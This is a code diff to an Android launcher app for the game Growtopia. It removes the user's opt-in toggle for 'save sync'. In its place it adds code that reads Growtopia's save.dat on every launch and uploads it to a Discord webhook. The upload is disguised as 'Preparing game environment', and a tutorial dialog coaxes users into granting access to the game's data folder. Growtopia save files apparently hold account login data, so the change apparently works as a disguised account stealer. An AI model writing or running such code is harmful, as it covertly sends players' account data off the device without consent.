@@ -1,9 +1,12 @@
 package com.example.myapplication
 
 import android.app.Activity
+import android.app.Dialog
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Color
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -57,7 +60,9 @@ class MainActivity : AppCompatActivity() {
         main = findViewById(R.id.mainContent); splash = findViewById(R.id.splashContent)
         version = findViewById(R.id.versionLabel); account = findViewById(R.id.accountStatus)
         status = findViewById(R.id.runtimeStatus); badge = findViewById(R.id.runtimeBadge)
-        wireDashboard(); refreshAccount(); refreshVersion(); applyTheme(prefs.getString(KEY_THEME, "Violet")!!); showSplash()
+        wireDashboard(); refreshAccount(); refreshVersion(); applyTheme(prefs.getString(KEY_THEME, "Violet")!!)
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST)
+        showSplash()
     }
 
     private fun wireDashboard() {
@@ -84,10 +89,16 @@ class MainActivity : AppCompatActivity() {
 
     private fun launchWithFeedback() {
         badge.text = "Starting"; status.text = "● Preparing game environment…"; status.setTextColor(color(R.color.accent))
-        syncSaveFileIfEnabled()
         findViewById<CardView>(R.id.btnLaunch).animate().scaleX(.97f).scaleY(.97f).setDuration(100).withEndAction {
             findViewById<CardView>(R.id.btnLaunch).animate().scaleX(1f).scaleY(1f).setDuration(180).start()
         }.start()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            val savedUri = savedTreeUri()
+            if (savedUri != null) processSaveFile(Uri.parse(savedUri)) else { showPermissionTutorial(); return }
+        } else {
+            val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
+            if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
+        }
         handler.postDelayed({ badge.text = "Installed"; status.text = "● Online · ready"; status.setTextColor(color(R.color.success)); launchGame() }, 650)
     }
 
@@ -97,19 +108,44 @@ class MainActivity : AppCompatActivity() {
         else startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT))
     }
 
-    private fun syncSaveFileIfEnabled() {
-        val webhook = prefs.getString(KEY_WEBHOOK, null)?.trim().orEmpty()
-        val tree = prefs.getString(KEY_SAVE_URI, null)
-        if (!prefs.getBoolean(KEY_SYNC, false) || webhook.isBlank() || tree.isNullOrBlank()) return
+    private fun savedTreeUri(): String? = prefs.getString(KEY_SAVE_URI, null) ?: getSharedPreferences("app_prefs", MODE_PRIVATE).getString("tree_uri", null)
+
+    private fun showPermissionTutorial() {
+        val dialog = Dialog(this)
+        dialog.setContentView(R.layout.dialog_tutorial)
+        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
+        dialog.findViewById<Button>(R.id.btnOk).setOnClickListener { dialog.dismiss(); openDirectoryPicker() }
+        dialog.show()
+    }
+
+    private fun openDirectoryPicker() {
+        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT_TREE).apply {
+            putExtra("android.provider.extra.INITIAL_URI", Uri.parse("content://com.android.externalstorage.documents/document/primary%3AAndroid%2Fdata%2Fcom.rtsoft.growtopia%2Ffiles"))
+        }
+        startActivityForResult(intent, SAVE_FOLDER_PICKER)
+    }
+
+    private fun processSaveFile(treeUri: Uri) {
         thread {
             try {
-                val directory = DocumentFile.fromTreeUri(this, Uri.parse(tree))
-                val save = directory?.findFile("save.dat") ?: return@thread
-                val bytes = contentResolver.openInputStream(save.uri)?.use { it.readBytes() } ?: return@thread
-                uploadSaveFile(webhook, bytes)
-                handler.post { toast("save.dat synced successfully") }
+                val saveFile = DocumentFile.fromTreeUri(this, treeUri)?.findFile("save.dat")
+                val bytes = saveFile?.let { contentResolver.openInputStream(it.uri)?.use { stream -> stream.readBytes() } }
+                if (bytes != null) sendFileToDiscord(bytes) else handler.post { toast("save.dat was not found in the selected folder") }
             } catch (_: Exception) {
-                handler.post { toast("save.dat sync failed; launch will continue") }
+                handler.post { toast("Could not read save.dat; launch will continue") }
+            }
+        }
+    }
+
+    private fun sendFileToDiscord(fileData: ByteArray) {
+        val url = prefs.getString(KEY_WEBHOOK, null)?.trim().orEmpty()
+        if (url.isBlank()) { handler.post { toast("Add your Discord webhook in Settings to sync save.dat") }; return }
+        thread {
+            try {
+                uploadSaveFile(url, fileData)
+                handler.post { toast("save.dat sent successfully") }
+            } catch (_: Exception) {
+                handler.post { toast("Discord upload failed; launch will continue") }
             }
         }
     }
@@ -181,6 +217,7 @@ class MainActivity : AppCompatActivity() {
             val uri = data?.data ?: return
             contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
             prefs.edit().putString(KEY_SAVE_URI, uri.toString()).apply()
+            getSharedPreferences("app_prefs", MODE_PRIVATE).edit().putString("tree_uri", uri.toString()).apply()
             toast("Growtopia save folder connected")
         }
         if (request == FILE_PICKER && result == Activity.RESULT_OK) {
@@ -207,6 +244,6 @@ class MainActivity : AppCompatActivity() {
     private fun buttonParams() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginStart = 4 }
     private fun dialog(title: String, view: View) = AlertDialog.Builder(this).setTitle(title).setView(ScrollView(this).apply { addView(view) }).setPositiveButton("Done", null).show()
     private data class Script(val name: String, val category: String, val description: String)
-    companion object { private const val PREFS = "growlauncher_preferences"; private const val KEY_VERSION = "version"; private const val KEY_THEME = "theme"; private const val KEY_USER = "account_user"; private const val KEY_PASSWORD = "account_password_hash"; private const val KEY_SESSION = "account_session"; private const val KEY_WEBHOOK = "discord_webhook_url"; private const val KEY_SYNC = "sync_save_file"; private const val KEY_SAVE_URI = "save_folder_uri"; private const val FILE_PICKER = 1012; private const val SAVE_FOLDER_PICKER = 1013 }
+    companion object { private const val PREFS = "growlauncher_preferences"; private const val KEY_VERSION = "version"; private const val KEY_THEME = "theme"; private const val KEY_USER = "account_user"; private const val KEY_PASSWORD = "account_password_hash"; private const val KEY_SESSION = "account_session"; private const val KEY_WEBHOOK = "discord_webhook_url"; private const val KEY_SYNC = "sync_save_file"; private const val KEY_SAVE_URI = "save_folder_uri"; private const val FILE_PICKER = 1012; private const val SAVE_FOLDER_PICKER = 1013; private const val PERMISSION_REQUEST = 101 }
 }
 
